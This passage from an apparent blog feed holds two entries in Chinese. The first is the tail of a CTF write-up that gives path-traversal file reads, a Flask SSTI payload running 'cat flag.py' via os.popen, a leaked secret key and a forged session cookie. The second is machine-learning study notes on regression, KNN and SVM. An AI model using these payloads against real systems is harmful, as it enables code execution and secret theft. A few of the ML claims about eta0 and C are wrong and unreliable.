flag.py，这里任意文件读取过滤了flag关键词。</p><p>3.源码存在<strong>SSTI模板注入</strong></p><p>因为代码中有判断传入的session是否含n1code（ 这里可以理解为判断session的身份码），没有的话就创建这个session[‘n1code’]。</p><p>然后判断session[‘n1code’]是否为空，为空的的话就令 template（模板）为空，不为空的话就赋值 template 为一段实体编码过的HTML模板，并且**把session[‘n1code’]也带入到模板中渲染（渲染的代码会被执行，这里可以设计命令执行代码 )**。</p><p>也就是session中只要有n1code的内容，且不为空，就会被加入template模板中执行。这是只需在其中构造命令执行代码即可。</p><p>template解码后如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">template = &#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27; % session[&#x27;n1code&#x27;]</span><br></pre></td></tr></table></figure><h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p><strong>SSTI模板注入</strong></p><p>一般流程为：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;]</span><br></pre></td></tr></table></figure><p>说人话就是通过上面划线的语句，打开python命令执行的模块，这样我们的命令popen(&#39;cat flag.py&#39;).read()才能被执行。</p><p>（os.popen() 方法用于从获取一个命令的输出）。</p><p>因此payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;].popen(\&#x27;cat flag.py\&#x27;).read()&#125;&#125;&#x27;&#125;</span><br></pre></td></tr></table></figure><blockquote><h5 id="python-flask框架中的一些魔术方法"><a href="#python-flask框架中的一些魔术方法" class="headerlink" title="python flask框架中的一些魔术方法"></a>python flask框架中的一些魔术方法</h5><p><code>__class__</code> 返回类型所属的对象</p><p><code>__mro__</code> 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</p><p><code>__base__</code> 返回该对象所继承的基类 &#x2F;&#x2F;</p><p><code>__base__</code>和<code>__mro__</code>都是用来寻找基类的 <code>__subclasses__</code> 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</p><p><code>__init__</code> 类的初始化方法 <code>__globals__</code> 对包含函数全局变量的字典的引用</p></blockquote><p><strong>加密payload，写入session</strong>：</p><p>还有一个问题是这个payload无法直接写入cookie中的session，因为session还用了key.py进行加密。</p><p>所以查看key.py，得到加密的密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cwd/key.py</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812151727414.png" alt="image-20220812151727414"></p><p>然后使用工具 <strong>flask_session_cookie_manager3</strong>：</p><p><a href="https://codeload.github.com/noraj/flask-session-cookie-manager/zip/refs/heads/master">https://codeload.github.com/noraj/flask-session-cookie-manager/zip/refs/heads/master</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager3.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;].popen(\&#x27;cat flag.py\&#x27;).read()&#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>加密结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.YZuIBg.eOXIyEYlDww9MHN2rJZpk13froc</span><br></pre></td></tr></table></figure><p>那么这个就是我们的身份码n1code+命令执行语句，作为session被模板渲染后执行，就能读取flag文件</p><h4 id="执行攻击，拿到flag"><a href="#执行攻击，拿到flag" class="headerlink" title="执行攻击，拿到flag"></a>执行攻击，拿到flag</h4><p>最后使用burp开始抓包，填入在cookie的session字段填入构造的payload：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812152116080.png" alt="image-20220812152116080"></p><p>从回传的网页中得到flag。</p><h4 id="总结步骤-思路"><a href="#总结步骤-思路" class="headerlink" title="总结步骤(思路)"></a>总结步骤(思路)</h4><ol><li><p>利用linux下 &#x2F;porc目录下文件作用查看当前运行进程，得到server.py</p></li><li><p>分析server.py得知存在 key.py 和 flag.py（不可查取） ，且存在SSTI模板注入漏洞</p></li><li><p>构造模板注入语句，并使用flask_session_cookie_manager3.py脚本进行密钥加密</p></li><li><p>burp改包实现session伪造，命令执行。得到flag。</p></li></ol><p><strong>关于SSTI模板注入：</strong></p><p><a href="http://elssm.top/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/">http://elssm.top/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p><p><strong>关于cookie、session、token：</strong></p><p><a href="https://blog.csdn.net/qq_40925189/article/details/107030620">https://blog.csdn.net/qq_40925189/article/details/107030620</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件读取&quot;&gt;&lt;a href=&quot;#文件读取&quot; class=&quot;headerlink&quot; title=&quot;文件读取&quot;&gt;&lt;/a&gt;文件读取&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>机器学习实战</title>
    <link href="https://frankcao3.github.io/posts/61497"/>
    <id>https://frankcao3.github.io/posts/61497</id>
    <published>2022-07-30T04:20:29.000Z</published>
    <updated>2023-10-05T11:40:46.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="机器学习实战"><a href="#机器学习实战" class="headerlink" title="机器学习实战"></a>机器学习实战</h1><p>参考书目：</p><p>《机器学习实战：基于Scikit-Learn和TensorFlow》</p><p>《机器学习实战》</p><h2 id="先导知识："><a href="#先导知识：" class="headerlink" title="先导知识："></a>先导知识：</h2><ol><li><p><strong>监督学习中，一般使用两种类型的目标变量，标称型和数值型。</strong></p><p>标称型目标变量的结果只在有限目标集中取值，如真与假、动物分类集合{ 爬行类、鱼类、哺乳类、两栖类、植物、真菌}；数值型目标变量则可以从无限的数值集合中取值，如0.100、42.001、1000.743 等。标称型目标变量主要用来分类，数值型目标变量主要用于回归分析。</p></li><li><p><strong>机器学习的主要任务：分类和回归。</strong></p><p>分类是将实例数据划分到合适的分类中，回归主要用于预测数值型数据。分类和回归均属于<strong>监督学习</strong>，即这类算法必须知道样本的类别，即目标变量的分类信息。另外，<strong>无监督学习</strong>则指训练数据没有类别信息，也不会给定目标值。无监督学习可以进行聚类、密度估计（寻找描述数据统计值），也可以减少数据特征的维度，以便使用二维或三维图形来更直观地展示数据信息。</p></li><li><p><strong>如何选择算法：</strong></p><p><em>（1）首先考虑使用算法的目的。</em></p><p>如果是想要知道数据的目标变量的值，可以选择监督学习算法。如果目标变量是离散的，就选择分类器算法；如果目标变量是连续的，就选择回归算法。</p><p>如果不想预测目标变量的值，可以选择无监督学习算法。如果是要将数据划分为离散的组，就选择聚类算法；如果需要估计数据与每个分组的相似程度，则需要使用密度估计算法。</p><p><em>（2）其次需要考虑数据问题。</em></p><p>特征值是离散型变量还是连续型，特征值中是否存在缺失的值，何种原因造成的缺失，数据中是否存在异常值，某个特征发生的频率如何等等。</p></li><li><p><strong>开发机器学习应用程序的步骤：</strong></p><p>（1）收集数据；</p><p>（2）准备输入数据；</p><p>（3）分析输入数据：查看数据中是否存在空值、异常值等，确保没有垃圾数据。</p><p>（4）训练算法；</p><p>（5）测试算法；</p><p>（6）使用算法。</p></li></ol><h2 id="第一章-线性模型"><a href="#第一章-线性模型" class="headerlink" title="第一章 线性模型"></a>第一章 线性模型</h2><h4 id="1-线性回归（回归）"><a href="#1-线性回归（回归）" class="headerlink" title="1. 线性回归（回归）"></a>1. 线性回归（回归）</h4><p>线性模型就是对输入特征加权求和，再加上一个我们称为偏置项（也称为截距项）的常数，以此进行预测。</p><p>由于线性回归模型的梯度下降对特征缩放敏感，所以需要保证所有特征值的大小比例都差不多（比如使用Scikit-Learn的StandardScaler类），否则收敛的时间会长很多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"></span><br><span class="line">lin_reg = LinearRegression()</span><br><span class="line">lin_reg.fit(X, y)</span><br><span class="line"><span class="comment"># coef_存放回归系数，intercept_则存放截距</span></span><br><span class="line"><span class="built_in">print</span>(lin_reg.intercept_, lin_reg.coef_)</span><br><span class="line"><span class="built_in">print</span>(lin_reg.predict(X_new))</span><br></pre></td></tr></table></figure><p>其实大多数情况下不会使用纯线性回归，容易过拟合。通常会加上正则化（后面会讲到）。</p><p><u><em><strong>计算复杂度：</strong></em></u></p><p>特征数量比较大（例如100000）时，线性回归的计算将极其缓慢。但是另一方面，对于训练集中的实例数量来说，需要计算的方程是线性的，所以能够有效地处理大量的训练集，只要内存足够。在预测方面，线性回归模型一经训练（不论是标准方程还是梯度下降等其他算法），预测就非常快速：因为计算复杂度相对于想要预测的实例数量和特征数量来说，都是线性的。</p><h4 id="2-梯度下降"><a href="#2-梯度下降" class="headerlink" title="2. 梯度下降"></a>2. 梯度下降</h4><p><u><em><strong>标准方程：</strong></em></u></p><p>求线性模型的最优参数可以通过标准方程直接计算得到，但是涉及计算样本特征矩阵的内积，计算复杂度较高。但是优点是不需要特征缩放，不需要选择学习率以及进行迭代。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427104257714.png" alt="image-20210427104257714" style="zoom:50%;"><p><u><em><strong>梯度下降：</strong></em></u></p><p>梯度下降是一种非常通用的优化算法，能够为大范围的问题找到最优解。梯度下降的中心思想就是迭代地调整参数从而使成本函数最小化。</p><p>线性回归模型的成本函数恰好是个凸函数，所以在梯度下降时不会陷入局部最优。</p><p>应用梯度下降时，需要保证所有特征值的大小比例都差不多（比如使用Scikit-Learn的StandardScaler类），否则收敛的时间会长很多。</p><p><em><strong>批量梯度下降（BGD）：</strong></em></p><p>基于整个训练数据集对所有需要优化的参数进行同步优化。因此，<u>面对非常庞大的训练集时，算法会变得极慢</u>（不过我们即将看到快得多的梯度下降算法）。但是，梯度下降算法<u>随特征数量扩展的表现比较好</u>：如果要训练的线性模型拥有几十万个特征，使用梯度下降比标准方程要快得多。</p><p><strong>学习率</strong>控制了梯度下降的快慢，学习率太低，算法消耗时间太久，学习率太高，难以稳定到最优参数。要找到合适的学习率，可以使用网格搜索。</p><p>另外，参数优化的迭代次数也要适中，太低可能还未达到最优，太高浪费时间。一个简单的办法是，在开始时设置一个非常大的迭代次数，但是当梯度向量的值变得很微小时中断算法——也就是当它的范数变得低于（称为容差）时，因为这时梯度下降已经（几乎）到达了最小值。</p><p><em><strong>随机梯度下降（SGD）：</strong></em></p><p>批量梯度下降的主要问题是它要用整个训练集来计算每一步的梯度，所以训练集很大时，算法会特别慢。与之相反的极端是随机梯度下降，每一步在训练集中随机选择一个实例，并且仅<u>基于该单个实例来计算梯度</u>。这让算法变得快多了，也可以被用来训练海量的数据集。</p><p>另一方面，由于算法的随机性质，它比批量梯度下降要不规则得多。成本函数将不再是缓缓降低直到抵达最小值，而是不断上上下下，但是从整体来看，还是在慢慢下降。但是即使它到达了最小值，依旧还会持续反弹，永远不会停止。所以算法停下来的参数值肯定是足够好的，但不是最优的。</p><p>随机梯度下降其实可以<u>帮助算法跳出局部最小值</u>，所以相比批量梯度下降，它对找到全局最小值更有优势。因此，随机性的好处在于可以逃离局部最优，但缺点是<u>永远定位不出最小值</u>。要解决这个困境，有一个办法是<u>逐步降低学习率</u>（模拟退火）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 随机梯度下降，n_iter为迭代次数，penalty为惩罚项（正则化），eta0为迭代次数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line">sgd_reg = SGDRegressor(n_iter=<span class="number">50</span>, penalty=<span class="literal">None</span>, eta0=<span class="number">0.1</span>)</span><br><span class="line">sgd_reg.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(sgd_reg.intercept_, sgd_reg.coef_)</span><br></pre></td></tr></table></figure><p><strong>小批量梯度下降：</strong></p><p>每一步的梯度计算，基于一小部分随机的实例集也就是小批量。相比随机梯度下降，小批量梯度下降的主要优势在于可以从矩阵运算的硬件优化中获得显著的性能提升，特别是需要用到图形处理器时。</p><p>这个算法在参数空间层面的前进过程也不像SGD那样不稳定，特别是批量较大时。所以小批量梯度下降最终会比SGD更接近最小值一些。但是另一方面，它可能更难从局部最小值中逃脱</p><h4 id="3-多项式回归"><a href="#3-多项式回归" class="headerlink" title="3. 多项式回归"></a>3. 多项式回归</h4><p>当数据集并非线性时，可以将每个特征的幂次方添加为一个新特征，在拓展过的特征集上训练线性模型。这种方法被称为多项式回归。</p><p>PolynomialFeatures会在给定的多项式阶数下，添加所有特征组合。例如，有两个特征a和b，阶数degree&#x3D;3，PolynomialFeatures不只会添加特征a2、a3、b2和b3，还会添加组合ab、a2b以及ab2。</p><p>所以要小心特征组合的数量爆炸。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多项式回归，增加原特征的平方作为新特征</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> PolynomialFeatures</span><br><span class="line">poly_features = PolynomialFeatures(degree=<span class="number">2</span>, include_bias=<span class="literal">False</span>)</span><br><span class="line">X_poly = poly_features.fit_transform(X)</span><br><span class="line"><span class="comment"># X_poly现在包含原本的特征X和该特征的平方</span></span><br><span class="line">lin_reg = LinearRegression()</span><br><span class="line">lin_reg.fit(X_poly, y)</span><br><span class="line"><span class="built_in">print</span>(lin_reg.intercept_, lin_reg.coef_)</span><br></pre></td></tr></table></figure><p>或者使用管道技术一次完成：、</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">polynomial_regression = Pipeline([(<span class="string">&quot;poly_features&quot;</span>, PolynomialFeatures(degree=<span class="number">2</span>, include_bias=<span class="literal">False</span>)), (<span class="string">&quot;sgd_reg&quot;</span>, LinearRegression())])</span><br><span class="line">polynomial_regression.fit(X, y)</span><br></pre></td></tr></table></figure><h4 id="4-学习曲线"><a href="#4-学习曲线" class="headerlink" title="4. 学习曲线"></a>4. 学习曲线</h4><p>模型训练时会出现欠拟合和过拟合的问题。</p><p>如果无论怎么增大数据集，训练集和测试集的误差接近且较高，那么模型可能欠拟合。这时增大数据集是无效的，需要使用更复杂的模型和寻找更好的特征。</p><p>如果训练集和测试集的误差有一定差距，且在训练集上模型的表现好很多，那么说明模型过拟合了。这时需要增加训练数据，直到测试误差接近训练误差。或者对模型进行正则化。</p><h4 id="5-正则线性模型"><a href="#5-正则线性模型" class="headerlink" title="5. 正则线性模型"></a>5. 正则线性模型</h4><p>减少过度拟合的一个好办法就是对模型正则化（即约束它）：它拥有的自由度越低，就越不容易过度拟合数据。</p><p>比如对于多项式模型来说，正则化可以是降低多项式的阶数。对于线性模型，正则化通常通过约束模型的权重来实现。</p><p><u><em><strong>岭回归（Ridge Regression）：</strong></em></u></p><p>在成本函数中添加一个正则项，使得学习中的算法不仅需要拟合数据，同时还要让模型权重保持最小。</p><p>在执行岭回归之前，必须对数据进行缩放（例如使用StandardScaler），因为它对输入特征的大小非常敏感。大多数正则化模型都是如此。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427164855903.png" alt="image-20210427164855903" style="zoom:50%;"><p>超参数α控制的是对模型进行正则化的程度。如果α&#x3D;0，则岭回归就是线性模型。如果α非常大，那么所有的权重都将非常接近于零，结果是一条穿过数据平均值的水平线。</p><p>注意，正则项<u>只能在训练的时候添加到成本函数中</u>，一旦训练完成，你需要使用未经正则化的性能指标来评估模型性能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用标准方程求解的岭回归</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line">ridge_reg = Ridge(alpha=<span class="number">1</span>, solver=<span class="string">&quot;cholesky&quot;</span>)</span><br><span class="line">ridge_reg.fit(X, y)</span><br><span class="line">ridge_reg.predict([[<span class="number">1.5</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用梯度下降的岭回归,正则项为l2表示岭回归</span></span><br><span class="line">sgd_reg = SGDRegressor(penalty=<span class="string">&quot;l2&quot;</span>)</span><br><span class="line">sgd_reg.fit(X, y.ravel())</span><br><span class="line"><span class="built_in">print</span>(sgd_reg.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p>超参数penalty设置的是使用正则项的类型。设为”l2”表示希望SGD在成本函数中添加一个正则项，等于权重向量的l2范数的平方的一半，即岭回归。</p><p><u><em><strong>套索回归（Lasso Regression）：</strong></em></u></p><p>与岭回归一样，它也是向成本函数增加一个正则项，但是它增加的是权重向量的l1范数，而不是l2范数的平方的一半。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427183920256.png" alt="image-20210427183920256" style="zoom: 33%;"><p>Lasso回归的一个重要特点是它倾向于完全消除掉最不重要特征的权重（也就是将它们设置为零）。也就是说，Lasso回归会自动执行特征选择并输出一个稀疏模型（即只有很少的特征有非零权重）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Lasso回归</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line">lasso_reg = Lasso(alpha=<span class="number">0.1</span>)</span><br><span class="line">lasso_reg.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(lasso_reg.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>弹性网络（Elastic Net）：</strong></em></u></p><p>弹性网络是岭回归与Lasso回归之间的中间地带。其正则项就是岭回归和Lasso回归的正则项的混合，混合比例通过r来控制。当r＝0时，弹性网络即等同于岭回归，而当r＝1时，即相当于Lasso回归。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427204356724.png" alt="image-20210427204356724" style="zoom:50%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用弹性网络</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet</span><br><span class="line">elastic_net = ElasticNet(alpha=<span class="number">0.1</span>, l1_ratio=<span class="number">0.5</span>)</span><br><span class="line">elastic_net.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(elastic_net.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>如何选择正则化模型：</strong></em></u></p><p>模型正则化比不正则化可取。大多数情况下，应该避免使用纯线性回归。</p><p>岭回归是个不错的默认选择，但是如果你觉得实际用到的特征只有少数几个，那就应该更倾向于Lasso回归或是弹性网络，因为它们会将无用特征的权重降为零。</p><p>一般而言，弹性网络优于Lasso回归，因为当特征数量超过训练实例数量，又或者是几个特征强相关时，Lasso回归的表现可能非常不稳定。</p><h4 id="6-逻辑回归（分类）"><a href="#6-逻辑回归（分类）" class="headerlink" title="6. 逻辑回归（分类）"></a>6. 逻辑回归（分类）</h4><p>将数据正则化之后，比如使用StandardScaler类，使用LogisticRegression类进行模型建立。逻辑回归被广泛用于估算一个实例属于某个特定类别的概率。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427232532919.png" alt="image-20210427232532919"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"></span><br><span class="line">log_reg = LogisticRegression(C=<span class="number">1e5</span>)</span><br><span class="line">log_reg.fit(x_train, y_train)</span><br><span class="line">pre_pro = log_reg.predict_proba(x_test)</span><br></pre></td></tr></table></figure><p>如果你要求它预测出类别（使用predict（）方法而不是predict_proba（）方法），它将返回一个可能性最大的类别。</p><p>与其他线性模型一样，逻辑回归模型可以用l1或l2惩罚函数来正则化。Scikit-Learn默认添加的是l2函数。</p><p>控制Scikit-Learn的LogisticRegression模型正则化程度的超参数不是alpha（其他线性模型使用alpha），而是它的逆反：C，<u>C的值越高，模型正则化程度越高。</u></p><p><u><em><strong>Softmax回归:</strong></em></u></p><p>逻辑回归模型经过推广，可以直接支持多个类别，而不需要训练并组合多个二元分类器（如第3章所述）。这就是Softmax回归。</p><p>原理很简单：对于一个给定的实例x，Softmax回归模型首先计算出每个类别k的分数sk（x），然后对这些分数应用softmax函数（也叫归一化指数），估算出每个类别的概率。跟逻辑回归分类器一样，Softmax回归分类器将估算概率值最高的类别作为预测类别（也就是分数最高的类别）。</p><p>Softmax回归分类器一次只会预测一个类别（也就是说，它是多类别，但是不是多输出），所以它应该仅适用于互斥的类别之上。</p><p>Softmax回归的训练目标是得到一个能对目标类别做出高概率估算的模型（也就是其他类别的概率相应要很低），其成本函数（交叉熵）如下：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427232025182.png" alt="image-20210427232025182" style="zoom:67%;"><p>当只有两个类别（K&#x3D;2）时，该成本函数等价于逻辑回归的成本函数（log损失函数）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">softmax_reg = LogisticRegression(multi_class=<span class="string">&quot;multinomial&quot;</span>,solver=<span class="string">&quot;lbfgs&quot;</span>, C=<span class="number">10</span>)</span><br><span class="line">softmax_reg.fit(X, y)</span><br><span class="line">softmax_reg.predict([[<span class="number">5</span>, <span class="number">2</span>]])</span><br></pre></td></tr></table></figure><h2 id="第二章-KNN算法"><a href="#第二章-KNN算法" class="headerlink" title="第二章 KNN算法"></a>第二章 KNN算法</h2><p><strong>优点</strong>：精度高，对异常值不敏感，无数据输入假定。</p><p><strong>缺点</strong>：计算复杂度高、空间复杂度高。</p><p><strong>适用范围</strong>：数值型和标称型。</p><p>对未知类别属性的数据集中的每个点依次执行以下操作：<br>(1)  计算已知类别数据集中的点与当前点之间的距离（欧氏距离）；<br>(2)  按照距离递增次序排序；<br>(3)  选取与当前点距离最小的<strong>k</strong>个点；<br>(4)  确定前<strong>k</strong>个点所在类别的出现频率；<br>(5)  返回前<strong>k</strong>个点出现频率最高的类别作为当前点的预测分类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 6折交叉验证</span></span><br><span class="line">scores = cross_val_score(knn, x, y, cv=<span class="number">6</span>, scoring=<span class="string">&#x27;accuracy&#x27;</span>)</span><br></pre></td></tr></table></figure><p>当然，KNN也可以用来处理回归任务。返回邻近的K个样本点的标签值的平均数作为预测值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理回归任务</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line">knn_clf = KNeighborsRegressor(n_neighbors=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="第三章-SVM算法"><a href="#第三章-SVM算法" class="headerlink" title="第三章 SVM算法"></a>第三章 SVM算法</h2><p>能够执行线性或非线性分类、回归，甚至是异常值检测任务。它是机器学习领域最受欢迎的模型之一，特别适用于中小型复杂数据集的分类。</p><p><u><em><strong>优点：</strong></em></u></p><ol><li>用于二元和多元分类器、回归和新奇性检测</li><li>良好的预测生成器，提供了鲁棒的过拟合、噪声数据和异常点处理</li><li>当变量比样本还多是依旧有效</li><li>快速，即使样本量大于1万</li><li>自动检测数据的非线性，不用做变量变换</li></ol><p><u><em><strong>缺点：</strong></em></u></p><ol><li>应用在二元分类表现最好，其他预测问题表现不是太好</li><li>变量比样例多很多的时候，有效性降低，需要使用其他方案，例如SGD方案</li><li>只提供预测结果，如果想要获取预测概率，需要额外方法去获取</li><li>如果想要最优结果，需要调参。</li></ol><p><u><em><strong>使用SVM预测模型的通用步骤：</strong></em></u></p><ol><li>选择使用的SVM类</li><li>用数据训练模型</li><li>检查验证误差并作为基准线</li><li>为SVM参数尝试不同的值</li><li>检查验证误差是否改进</li><li>再次使用最优参数的数据来训练模型</li></ol><h4 id="1-线性SVM分类"><a href="#1-线性SVM分类" class="headerlink" title="1. 线性SVM分类"></a>1. 线性SVM分类</h4><p>生成决策边界（实线所示），不仅分离类别，并且尽可能远离最近的训练实例（大间隔分类）。决策边界由最接近边界的训练实例确定（支持），这些实例被称为支持向量（下图中已圈出）。</p><p>可以将SVM分类器视为在类别之间拟合可能的最宽的”街道“（平行的虚线所示）。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423214002939.png" alt="image-20210423214002939"></p><p>SVM对<strong>特征缩放</strong>非常敏感，在垂直刻度和水平刻度上生成的决策边界可能存在很大的差异。在左图中，垂直刻度（0<del>90）比水平刻度（0</del>6）大得多，因此可能的决策边界接近于水平。在特征缩放（例如使用Scikit-Learn的StandardScaler）后，决策边界看起来好很多（见右图）。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423214542324.png" alt="image-20210423214542324"></p><p><u><em><strong>软间隔分类：</strong></em></u></p><p>如果严格地让所有实例都不在”街道“上，并且位于正确的一边，这就是硬间隔分类。硬间隔分类有2个问题：一个是它只在数据线性可分离时才有效；一个是对异常值特别敏感（会影响泛化能力）。</p><p>为了避免以上问题，灵活地使用模型，我们尽可能在保持街道宽阔和限制间隔违例（即位于街道之上，甚至在错误的一边的实例）之间找到良好的平衡，这就是软间隔分类。在Scikit-Learn的SVM类中，可以通过超参数C来控制这个平衡：C值越小，则街道越宽，但是间隔违例也会越多。</p><p>如果你的SVM模型过度拟合，可以试试通过降低C来进行正则化。</p><p><u><em><strong>SMO算法：</strong></em></u></p><p>在求解SVM的决策边界（求解参数）时，会遇到规模正比于训练样本数量的问题，为了避开这个障碍，使用SMO算法来求解其中的参数。</p><p>SMO的思想：</p><p>每次选择2个变量，然后固定其他变量（参数），然后优化选择的这2个变量，因为每次只优化2个变量，所以非常高效。</p><p><u><em><strong>使用：</strong></em></u></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20181206003046683.png" 